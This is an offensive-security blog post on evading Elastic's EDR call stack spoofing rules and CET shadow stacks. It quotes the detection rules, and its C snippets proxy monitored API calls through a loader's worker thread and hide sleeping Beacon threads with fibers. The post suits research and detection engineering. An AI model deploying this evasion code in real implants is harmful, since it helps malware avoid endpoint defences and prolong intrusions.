# https://bigbingus.com/posts/stop-being-weird/

## Background

For the past few weeks I’ve been experimenting with Control Flow Enforcement Technology (CET) mitigations and Elastic’s call stack spoofing detections. Specifically their [API Call via Jump ROP Gadget](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml), [Stack Spoofing via ROP Gadget for Dll Load](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_dll_load.toml) and [Stack Spoofing via ROP Gadget for Memory API](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml) rules and I wanted to share my understanding of the current situation and a potential way forward.

_Code: [github.com/Sizeable-Bingus/MassDriver](https://github.com/Sizeable-Bingus/MassDriver)_

_There are multiple ways of spoofing a call stack but I will be referring to what I see to be the most common which is gadget-based with synthetic frames._

### Call Stack Spoofing

The goal of call stack spoofing is to eliminate unbacked return addresses from the call stack when calling a monitored API, as this is a high fidelity indicator of shellcode. When no spoofing is in place the classic execution flow looks something like:

```
Artifact.exe -> shellcode -> LoadLibraryA("wininet.dll")

Elastic sees:
    LoadLibraryA          <- kernel32.dll (backed)
    0xDEADBEEF            <- unbacked return
    0x12345678            <- non unwindable garbage
    0x12345678            <- non unwindable garbage

Sensitive API returning to unbacked memory -> process killed
```

With call stack spoofing the shellcode now (at a high level) does the following spoofing routine before making the call to the monitored API:

1. Find a `jmp <nonvol>` gadget (typically in `kernelbase`) and stash it in a non-volatile register
2. Build fake `RtlUserThreadStart` and `BaseThreadInitThunk` frames
3. Push the gadget address as the return target
4. Jump to the target API

```
Artifact.exe -> shellcode -> spoofing routine -> LoadLibraryA("wininet.dll")

Elastic sees:
    kernelbase.dll!LoadLibraryA
    kernelbase.dll!SomeFunction+0x123    <- jmp <nonvol> gadget
    kernel32.dll!BaseThreadInitThunk     <- synthetic frame
    ntdll.dll!RtlUserThreadStart         <- synthetic frame

No unbacked addresses -> all good :)
```

This works for classic call stack detections that simply scan for unbacked return addresses in the call stack. However, this falls apart when subject to additional scrutiny like the aforementioned rules.

### Call Stack Spoofing Detections

The [first rule](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml) detects this kind of call stack spoofing. We are most interested in the first detection condition of the rule, which matches when calling one of the monitored APIs if your process has `image_rop` behaviour (a return address in the stack is not immediately preceded by a `call` instruction) and returns to a `jmp <REG>` or `push <REG>; ret` pattern:

```
api where process.Ext.api.behaviors == "image_rop" and
 process.Ext.api.name in ("VirtualAlloc", "VirtualProtect", "WriteProcessMemory", "SetThreadContext", "SuspendThread", "VirtualProtectEx") and
 not process.thread.Ext.call_stack_final_user_module.name in ("Kernel", "Unbacked") and
 /* final user module trailing bytes starts with JMP or CALL REG pattern */
 (
  _arraysearch(process.thread.Ext.call_stack, $entry,
               stringcontains~($entry.symbol_info, process.thread.Ext.call_stack_final_user_module.name) and $entry.callsite_trailing_bytes regex """(([23][6e]|[45].|6[4-7]|90|f[023])?ff[12de][3-7]|([23][6e]|4.|6[4-7]|90|f[023])?5[3-7]c3).+""" and not $entry.callsite_trailing_bytes : "ff15*")

<...SNIP...>
```

This works quite well as gadgets that are preceded by a `call` are fairly rare, and the most common way of obtaining a `jmp <nonvol>` gadget is to scan `kernelbase.dll` at runtime and pick a random one (which won’t be `image_rop` compatible):

```
Artifact.exe -> shellcode -> spoofing routine -> LoadLibraryA("wininet.dll")

Elastic sees:
        kernelbase.dll!LoadLibraryA
        kernelbase.dll!SomeFunction+0x123    <- jmp <nonvol> with no preceding `call`
        kernel32.dll!BaseThreadInitThunk
        ntdll.dll!RtlUserThreadStart

image_rop and returning to gadget -> process killed
```

The natural answer to this is to find `image_rop` compatible gadgets. This can be done with something like RastaMouse’s [GadgetHunter](https://github.com/rasta-mouse/GadgetHunter), which scans for gadgets preceded by call instructions. The spoofing routine is the same except a specific gadget is used instead of a random one:

```
Artifact.exe -> LoadLibraryA("archiveint.dll") -> shellcode -> spoofing routine -> LoadLibraryA("wininet.dll")

Elastic sees:
        kernelbase.dll!LoadLibraryA
        archiveint.dll!SomeFunction+0x123     <- jmp <nonvol> with preceding `call`
        kernel32.dll!BaseThreadInitThunk
        ntdll.dll!RtlUserThreadStart
```

However, since these `image_rop` compatible gadgets are fairly rare across Windows DLLs, their usage to call monitored APIs can be susceptible to call stack signatures as shown in the [second rule](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml) (last call on left):

```
query = '''
library where
  dll.name in (
    "ws2_32.dll",
    "wininet.dll",
    "winhttp.dll",
    "system.directoryservices.ni.dll",
    "system.management.automation.ni.dll",
    "netapi32.dll",
    "dnsapi.dll"
  ) and
  process.thread.Ext.call_stack_summary in (
    "ntdll.dll|kernelbase.dll|dfshim.dll|kernel32.dll|ntdll.dll",
    "ntdll.dll|dfshim.dll|kernel32.dll|ntdll.dll",
    "ntdll.dll|kernelbase.dll|archiveint.dll|kernel32.dll|ntdll.dll",
    "ntdll.dll|archiveint.dll|kernel32.dll|ntdll.dll",
    "ntdll.dll|kernelbase.dll|authfwsnapin.dll|kernel32.dll|ntdll.dll",
    "ntdll.dll|authfwsnapin.dll|kernel32.dll|ntdll.dll",

<...SNIP...>
```

Now this method of spoofing is forced into a losing situation where specific gadgets must be used to avoid `image_rop`, but since those gadgets are relatively rare their usage can eventually be signatured:

```
Artifact.exe -> LoadLibraryA("archiveint.dll") -> Artifact.exe -> shellcode -> spoofing routine -> LoadLibraryA("wininet.dll")

Elastic sees:
        ntdll.dll!LdrLoadDll
        kernelbase.dll!LoadLibraryA
        archiveint.dll!SomeFunction+0x123
        kernel32.dll!BaseThreadInitThunk
        ntdll.dll!RtlUserThreadStart

Callstack summary matches
ntdll.dll|kernelbase.dll|archiveint.dll|kernel32.dll|ntdll.dll -> process killed
```

_You might be thinking you could drop the `kernel32.dll!BaseThreadInitThunk` and `ntdll.dll!RtlUserThreadStart` frames to avoid these signatures, but a truncated stack is even more suspicious._

### Control-flow Enforcement Technology (CET)

[CET](https://www.intel.com/content/www/us/en/content-details/785687/complex-shadow-stack-updates-intel-control-flow-enforcement-technology.html) is a mitigation targeting ROP. At a high level it works by storing a protected copy of the call stack that an attacker cannot control. Whenever a `ret` instruction is executed the address to return to is checked against the protected copy, and if they do not match there is a fault. For a deeper dive on how this is implemented on Windows, see [this writeup](https://windows-internals.com/cet-on-windows/).

This effectively kills this method of call stack spoofing since the stack frame is modified to return to the `jmp <nonvol>` gadget, which will not match the actual return address on the shadow stack.

There has been some [fantastic research](https://klezvirus.github.io/posts/Byoud/) by klezVirus on CET compatible call stack spoofing which I highly recommend reading. I won’t go into detail on his technique here, but instead show my attempt at taking his advice by trying to make shellcode as natural as possible.

> “As both hardware and software mitigations become widely adopted, creating effective evasion techniques will get more difficult. Malware authors will probably find it safer to implement more natural execution flows that resemble legitimate software rather than traditional exploits.”

## Being Normal

![Spongebob meme](https://bigbingus.com/posts/stop-being-weird/normal.jpg)

Inspired by klezVirus’ research I decided to reason about the simplest solution I could think of to get a normal execution flow while still keeping our 1337 sh311c0d3z alive.

The core idea is that traditional malware has some level of normal execution to load the shellcode (i.e. your artifact), so we can have the shellcode offload the execution of all monitored APIs to the artifact to get a clean call stack without any spoofing at all.

Before executing the shellcode the artifact will first start a worker thread to listen for messages from the shellcode:

#### mass\_driver.h

```c
#define WM_CALL_FUNCTION (WM_USER + 1)

typedef ULONG_PTR (*MD_FUNC_PTR)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);

typedef struct {
    HANDLE hDone;
    MD_FUNC_PTR lpFunction;
    DWORD dwArgc;
    ULONG_PTR result;
    ULONG_PTR args[10];
} MD_FUNCTION_CALL, *PMD_FUNCTION_CALL;
```

#### main.c

```c
DWORD WINAPI massDriverWorker(LPVOID lpParam) {
    MSG msg;

    PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);

    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_CALL_FUNCTION) {
            PMD_FUNCTION_CALL pCall = (PMD_FUNCTION_CALL)msg.lParam;
            ULONG_PTR result = pCall->lpFunction(pCall->args[0], pCall->args[1], pCall->args[2], pCall->args[3], pCall->args[4], pCall->args[5], pCall->args[6], pCall->args[7], pCall->args[8], pCall->args[9]);
            pCall->result = result;
            SetEvent(pCall->hDone);
        }
    }

    return 0;
}
```

When the shellcode wants to call a monitored API it sets up the function call structure and sends it to the worker thread:

#### shellcode.c

```c
ULONG_PTR massDriver(DWORD dwThreadId, LPVOID lpFunction, DWORD dwArgc, ...) {
    va_list args;
    MD_FUNCTION_CALL call = {0};
    call.lpFunction = lpFunction;
    call.dwArgc = dwArgc;
    call.hDone = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);

    va_start(args, dwArgc);
    for (DWORD i = 0; i < dwArgc; i++) {
        call.args[i] = va_arg(args, ULONG_PTR);
    }
    va_end(args);

    USER32$PostThreadMessageA(dwThreadId, WM_CALL_FUNCTION, 0, (LPARAM)&call);
    KERNEL32$WaitForSingleObject(call.hDone, INFINITE);
    return call.result;
}

void go(DWORD dwMassDriverThreadId) {
    HMODULE hMod = (HMODULE)massDriver(dwMassDriverThreadId, KERNEL32$LoadLibraryA, 1, "wininet.dll");
}
```

We can see the shellcode sends the `LoadLibraryA` call to the artifact and has a normal call stack:

![x64dbg LoadLibraryA call stack PoC](https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260504110840.png)

![x64dbg dprintf verification](https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260504111901.png)

## Being Useful

I decided to include an [example loader](https://github.com/Sizeable-Bingus/MassDriver) to show this same technique applied to something a bit more concrete. Currently the example just hooks `LoadLibraryA` and `Sleep` calls, but other hooks are easily added. Here we can see this idea applied at runtime when we execute the `whoami` BOF, which causes Beacon to call `LoadLibraryA` when resolving `SECUR32!GetUserNameExA`:

![Running whoami BOF in Cobalt Strike](https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511094402.png)

![x64dbg LoadLibraryA call stack with Beacon](https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511094329.png)

This pattern of waiting on the artifact worker thread works fine for most API calls since (as far as I know) only the call stack of the calling thread is inspected when a monitored API is called. However, this doesn’t work well during sleep, as the sleep call sent to the worker thread will be normal, but the thread waiting on the call in the worker thread will look exactly like a sleeping beacon:

![Sleeping thread call stack](https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511095000.png)![Waiting thread call stack](https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511095032.png)

So now we are back to square one when it comes to masking the stack at sleep, except we can use the same concept in a slightly different way by getting funky with [fibers](https://agraphicsguynotes.com/posts/fiber_in_cpp_understanding_the_basics/). Fibers are given special support under CET as their function depends on swapping their stack frame (if you want to know about the internals of this process there’s a [great slide deck](https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf) by Bing Sun, Jin Liu and Chong Xu that explains how fibers work under CET).

#### mass\_driver.h

```c
typedef struct {
    LPVOID pCallerFiber;
    DWORD dwSleepTime;
} FIBER_SLEEP_CTX, *PFIBER_SLEEP_CTX;
```

#### runner.c (artifact)

```c
VOID WINAPI fiberSleepProc(LPVOID lpParam) {
    PFIBER_SLEEP_CTX pCtx = (PFIBER_SLEEP_CTX)lpParam;
    Sleep(pCtx->dwSleepTime);
    SwitchToFiber(pCtx->pCallerFiber);
}
```

#### hooks.h (shellcode)

```c
VOID fiberSleep(DWORD dwMilliseconds, LPVOID lpFiberSleepProc) {
    FIBER_SLEEP_CTX ctx = {0};
    ctx.pCallerFiber = KERNEL32$ConvertThreadToFiber(NULL);
    ctx.dwSleepTime = dwMilliseconds;

    LPVOID sleepFiber = KERNEL32$CreateFiber(0, (LPFIBER_START_ROUTINE)lpFiberSleepProc, &ctx);

    KERNEL32$SwitchToFiber(sleepFiber);
    KERNEL32$DeleteFiber(sleepFiber);
    KERNEL32$ConvertFiberToThread();
}
```

Here we convert our Beacon thread to a fiber, create a fiber on our `fiberSleepProc`, and then switch to that fiber. The `fiberSleepProc` simply sleeps for the requested amount of time and switches back to the shellcode fiber, which is then converted back to a thread.

With both the function proxy and fiber sleep implemented, we get CET compatible clean call stacks during sensitive API calls and while sleeping. Here we can see the full PoC running on a CET enabled system:

![System Informer showing CET enabled modules](https://bigbingus.com/posts/stop-being-weird/CETModules.png)

![System Informer CET LoadLibraryA call stack](https://bigbingus.com/posts/stop-being-weird/CETLL.png)![System Informer CET Sleep call stack](https://bigbingus.com/posts/stop-being-weird/CETSleep.png)

## Caveats

This is more of a workaround than an actual replacement for call stack spoofing. You lose a lot of flexibility when your loader and payload are dependent on your artifact, and this dependency complicates things like process injection or other in memory shenanigans. It can be annoying to work with from a development perspective, as you have shared functionality between the shellcode and artifact instead of a traditional clean handoff.

The fiber sleep trick is fairly old and could be a detection vector.

There is also extra functionality on disk which can be collected, analyzed, signatured, etc., but I don’t think this would be that big of a deal as there are many ways of implementing this same concept and it’s pretty low effort to do so.

## Final Thoughts

Call stack spoofing will be increasingly complex as detections and exploit mitigations target the anomalies it relies on. I’ve shown an example of how to move the critical parts of existing tooling into normal execution flows. I think traditional in memory capability will eventually fall out of favor in the (far) future for most teams, but my entire understanding of this situation could be flawed, so make up your own mind.

Code: [github.com/Sizeable-Bingus/MassDriver](https://github.com/Sizeable-Bingus/MassDriver)

## References

- [https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense\_evasion\_api\_call\_via\_jump\_rop\_gadget.toml](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml)
- [https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense\_evasion\_stack\_spoofing\_via\_rop\_gadget\_for\_dll\_load.toml](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_dll_load.toml)
- [https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense\_evasion\_stack\_spoofing\_via\_rop\_gadget\_for\_memory\_api.toml](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml)
- [https://www.intel.com/content/www/us/en/content-details/785687/complex-shadow-stack-updates-intel-control-flow-enforcement-technology.html](https://www.intel.com/content/www/us/en/content-details/785687/complex-shadow-stack-updates-intel-control-flow-enforcement-technology.html)
- [https://klezvirus.github.io/posts/Byoud/](https://klezvirus.github.io/posts/Byoud/)
- [https://github.com/rasta-mouse/GadgetHunter](https://github.com/rasta-mouse/GadgetHunter)
- [https://agraphicsguynotes.com/posts/fiber\_in\_cpp\_understanding\_the\_basics/](https://agraphicsguynotes.com/posts/fiber_in_cpp_understanding_the_basics/)
- [https://windows-internals.com/cet-on-windows/](https://windows-internals.com/cet-on-windows/)
- [https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf](https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf)